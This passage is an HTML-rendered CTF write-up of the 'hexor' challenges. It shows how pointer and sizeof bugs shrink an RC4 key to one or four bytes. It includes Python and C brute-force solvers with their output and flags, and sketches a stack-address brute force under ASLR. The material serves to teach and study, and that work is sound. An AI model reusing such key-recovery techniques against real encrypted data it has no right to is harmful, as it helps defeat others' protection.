+first character made a difference in the output, meaning that we
+have <code>256**1</code> different possible keys, and that&rsquo;s just bruteforcing
+one character. But where is this evident in the code?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>key <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
+<span style="color:#75715e">/* Initialize encryption context */</span>
+<span style="color:#66d9ef">struct</span> rc4_ctx ctx;
+rc4_init(<span style="color:#f92672">&amp;</span>ctx, <span style="color:#f92672">*</span>key);
+</code></pre></div><p>We initially get the key correctly, however we give <code>rc4_init</code>
+a pointer to key, essentially this is <code>**argv[1]</code>. We can illustrate:</p>
+<pre tabindex="0"><code>argv[1] = secret_key
+*key -&gt; secret_key
+**key -&gt; s
+</code></pre><p>We remember that pointers can also be written as <code>key[]</code> so we can write something like:</p>
+<pre tabindex="0"><code>argv[1] = secret_key
+key[0] = argv[1] = secret_key
+key[0][0] = secret_key[0] = s
+</code></pre><p>We can implement a quick and dirty bruteforce in python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> subprocess
+
+<span style="color:#66d9ef">for</span> n <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">256</span>):
+    p1 <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen([<span style="color:#e6db74">&#34;cat&#34;</span>, <span style="color:#e6db74">&#34;flag.bin&#34;</span>], stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
+    p2 <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output([<span style="color:#e6db74">&#34;./hexor&#34;</span>, chr(n)], stdin<span style="color:#f92672">=</span>p1<span style="color:#f92672">.</span>stdout)
+
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag{&#34;</span> <span style="color:#f92672">in</span> p2:
+        print(p2)
+</code></pre></div><p><code>flag{8 bit security is not a lot of security}</code></p>
+<h1 id="finals---hexor-2">Finals - Hexor 2</h1>
+<p>Immediately we should notice that we&rsquo;re given a new and specific
+32-bit gcc line: <code>gcc -Wall -Wextra -Wpedantic -m32 -O2 hexor.c -o hexor</code></p>
+<p>We see that it also defines this in the top of the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#define array_length(x) ((size_t) sizeof(x) / sizeof(x[0]))
+</span></code></pre></div><p>This takes the overall size and divides it withe first element, now it uses the
+size_t which is of the unsigned integer type. However this is now 32-bit, meaning
+that this will return a different size.
+32-bit:</p>
+<pre tabindex="0"><code>cave@townie:~/CTF/fe-ctf/finals/hexor-2$ ./hexor lololol &lt; flag.bin
+Length of key: 7
+This is the length returned by array_length: 4
+</code></pre><p>64-bit:</p>
+<pre tabindex="0"><code>cave@townie:~/CTF/fe-ctf/finals/hexor-2$ ./hexor lololol &lt; flag.bin
+Length of key 7
+This is the length: 8
+</code></pre><p>So in our 32-bit version we have to bruteforce 4 bytes, this is feasible. So
+that&rsquo;s what we did.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define u8 uint8_t
+</span><span style="color:#75715e">#define u16 uint16_t
+</span><span style="color:#75715e">#define u32 uint32_t
+</span><span style="color:#75715e">#define u64 uint64_t
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#define array_length(x) ((size_t)sizeof(x) / sizeof(x[0]))
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">struct</span> rc4_ctx
+{
+    u8 S[<span style="color:#ae81ff">256</span>];
+};
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">swap</span>(u8 <span style="color:#f92672">*</span>a, u8 <span style="color:#f92672">*</span>b)
+{
+    <span style="color:#66d9ef">int</span> tmp <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>a;
+    <span style="color:#f92672">*</span>a <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>b;
+    <span style="color:#f92672">*</span>b <span style="color:#f92672">=</span> tmp;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">rc4_init</span>(<span style="color:#66d9ef">struct</span> rc4_ctx <span style="color:#f92672">*</span>ctx, <span style="color:#66d9ef">const</span> u8 <span style="color:#f92672">*</span>key)
+{
+
+    <span style="color:#66d9ef">int</span> len <span style="color:#f92672">=</span> array_length(key);
+    <span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+    <span style="color:#66d9ef">for</span> (u32 i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> array_length(ctx<span style="color:#f92672">-&gt;</span>S); i<span style="color:#f92672">++</span>)
+        ctx<span style="color:#f92672">-&gt;</span>S[i] <span style="color:#f92672">=</span> i;
+
+    <span style="color:#66d9ef">for</span> (u32 i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> array_length(ctx<span style="color:#f92672">-&gt;</span>S); i<span style="color:#f92672">++</span>)
+    {
+        j <span style="color:#f92672">+=</span> ctx<span style="color:#f92672">-&gt;</span>S[i] <span style="color:#f92672">+</span> ((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)key)[i <span style="color:#f92672">%</span> len];
+        j <span style="color:#f92672">%=</span> <span style="color:#66d9ef">sizeof</span>(ctx<span style="color:#f92672">-&gt;</span>S);
+
+        swap(<span style="color:#f92672">&amp;</span>ctx<span style="color:#f92672">-&gt;</span>S[i], <span style="color:#f92672">&amp;</span>ctx<span style="color:#f92672">-&gt;</span>S[j]);
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">rc4_crypt</span>(<span style="color:#66d9ef">struct</span> rc4_ctx <span style="color:#f92672">*</span>ctx, u8 <span style="color:#f92672">*</span>buffer, u32 len)
+{
+
+    <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+    <span style="color:#66d9ef">for</span> (size_t n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; n <span style="color:#f92672">&lt;</span> len; n<span style="color:#f92672">++</span>)
+    {
+        i <span style="color:#f92672">=</span> (i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">%</span> array_length(ctx<span style="color:#f92672">-&gt;</span>S);
+        j <span style="color:#f92672">=</span> (j <span style="color:#f92672">+</span> ctx<span style="color:#f92672">-&gt;</span>S[i]) <span style="color:#f92672">%</span> array_length(ctx<span style="color:#f92672">-&gt;</span>S);
+
+        swap(<span style="color:#f92672">&amp;</span>ctx<span style="color:#f92672">-&gt;</span>S[i], <span style="color:#f92672">&amp;</span>ctx<span style="color:#f92672">-&gt;</span>S[j]);
+        <span style="color:#66d9ef">int</span> rnd <span style="color:#f92672">=</span> ctx<span style="color:#f92672">-&gt;</span>S[(ctx<span style="color:#f92672">-&gt;</span>S[i] <span style="color:#f92672">+</span> ctx<span style="color:#f92672">-&gt;</span>S[j]) <span style="color:#f92672">%</span> array_length(ctx<span style="color:#f92672">-&gt;</span>S)];
+
+        buffer[n] <span style="color:#f92672">=</span> rnd <span style="color:#f92672">^</span> buffer[n];
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">brute_force</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ciphertext2, <span style="color:#66d9ef">int</span> ciphertext_len)
+{
+    <span style="color:#66d9ef">char</span> key[<span style="color:#ae81ff">4</span>];
+    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>plaintext <span style="color:#f92672">=</span> malloc(ciphertext_len);
+
+    <span style="color:#75715e">//char characters[] = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;;
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x7e</span>; i<span style="color:#f92672">++</span>)
+    {
+        printf(<span style="color:#e6db74">&#34;Trying key: %d</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>, i);
+        fflush(stdout);
+        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x7e</span>; j<span style="color:#f92672">++</span>)
+        {
+            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>; k <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x7e</span>; k<span style="color:#f92672">++</span>)
+            {
+                <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> l <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>; l <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x7e</span>; l<span style="color:#f92672">++</span>)
+                {
+                    key[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> i;
+                    key[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> j;
+                    key[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> k;
+                    key[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> l;
+                    <span style="color:#66d9ef">struct</span> rc4_ctx ctx;
+                    rc4_init(<span style="color:#f92672">&amp;</span>ctx, key);
+                    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ciphertext <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">128</span>);
+                    memcpy(ciphertext,ciphertext2,<span style="color:#ae81ff">128</span>);
+                    rc4_crypt(<span style="color:#f92672">&amp;</span>ctx, ciphertext, ciphertext_len);
+
+                    <span style="color:#66d9ef">if</span> (ciphertext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;f&#39;</span> <span style="color:#f92672">&amp;&amp;</span> ciphertext[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;l&#39;</span> <span style="color:#f92672">&amp;&amp;</span> ciphertext[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">&amp;&amp;</span> ciphertext[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;g&#39;</span>)
+                    {
+                        printf(<span style="color:#e6db74">&#34;key: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, key);
+                        printf(<span style="color:#e6db74">&#34;plaintext: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ciphertext);
+                        fflush(stdout);
+                        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+                    }
+                }
+            }
+        }
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[]) {
+    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ciphertext <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">128</span>);
+    <span style="color:#66d9ef">int</span> ciphertext_len <span style="color:#f92672">=</span> read(STDIN_FILENO, ciphertext, <span style="color:#ae81ff">128</span>);
+    <span style="color:#75715e">// brute force stdin ciphertext
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (brute_force(ciphertext, ciphertext_len)<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>)
+    puts(<span style="color:#e6db74">&#34;yay&#34;</span>);
+    <span style="color:#66d9ef">else</span>
+    puts(<span style="color:#e6db74">&#34;Tough luck ):&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>And we get the flag:</p>
+<pre tabindex="0"><code>cave@townie:~/CTF/fe-ctf/finals/hexor-2$ time cat flag.bin | ./sol
+key: @AVey: 64
+plaintext: flag{yes, 32&gt;8, but still}
+
+yay
+
+real    0m26.800s
+user    0m25.040s
+sys     0m1.715s
+</code></pre><p>We made some assumptions here, that the encryption key was all printable characters
+ie. <code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</code>password or:
+<code>62**4=14776336</code> combinations, which is just a <code>3</code> byte bruteforce. Of course
+instead of compiling with the -O2 flag they give us, we compile it with -O3,
+so it goes a bit faster.</p>
+<h1 id="finals---hexor-3-exercise-for-reader">Finals - Hexor 3 (Exercise for reader)</h1>
+<p>This was the last hexor challenge I would say I contributed in solving. As
+I spent most of the CTF doing the two browser pwns, which will be a separate post at
+some point. For now let&rsquo;s look at hexor 3:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>mutable_key <span style="color:#f92672">=</span> alloca(<span style="color:#ae81ff">0x1000</span>);
+strcpy(mutable_key, <span style="color:#e6db74">&#34;Salted__&#34;</span>);
+strncat(mutable_key, argv[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">0xfff</span>);
+
+<span style="color:#75715e">/* Initialize encryption context */</span>
+<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>key <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>mutable_key;
+<span style="color:#66d9ef">struct</span> rc4_ctx ctx;
+rc4_init(<span style="color:#f92672">&amp;</span>ctx, key);
+</code></pre></div><p>Now we see that at rc4_init they give a pointer to the address of mutable_key,
+this is a stack address, so we need to bruteforce this address. We know that
+there&rsquo;s ASLR on the system. We know therefore that there is:
+<code>0x7fffffffffff-0x7ffce0000000=13421772799</code>, i.e. <code>log256(13421772799) = 4.2</code> bytes.</p>
+<p>So we write another bruteforcing script, and do this again. This is left as an
+exercise for the reader. Remember -O3. Remember that stack addresses are 8-byte aligned.
+It might be interesting to try first bruteforcing with, addresses 0x0, 0x8, etc. Due
+to the fact that this is how the addresses show up in gdb:</p>
+<pre tabindex="0"><code>► 0x5555555551c5 &lt;main+165&gt;    call   rc4_init                &lt;rc4_init&gt;
+    rdi: 0x7fffffffdbf0 ◂— 0x0
+    rsi: 0x7fffffffdbe8 —▸ 0x7fffffffcbd0 ◂— 'Salted__L'
+</code></pre><p>We ended up getting 7th out of 10 qualifying teams for the finals. The two browser pwn
+writeups will come at a later time, as I would like it to be a high quality post.</p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+
+        <div class="site-footer">
+  
+  
+</div>
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
